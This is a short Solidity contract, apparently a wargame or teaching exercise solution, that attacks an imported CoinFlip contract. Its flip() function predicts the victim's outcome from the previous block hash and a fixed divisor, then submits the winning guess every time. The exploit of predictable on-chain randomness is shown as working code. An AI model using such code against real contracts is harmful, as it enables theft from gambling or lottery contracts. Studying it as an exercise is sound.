// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.0;

//import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import "./CoinFlip.sol";

contract CoinFlipAttack {

  CoinFlip public victim;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor (address _victimAddr){
    victim = CoinFlip(_victimAddr);

  }

  function flip()public returns (bool){
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlipValue=uint256(blockValue/FACTOR);
    bool correctSide = coinFlipValue == 1 ? true : false;
    return victim.flip(correctSide);
  }
}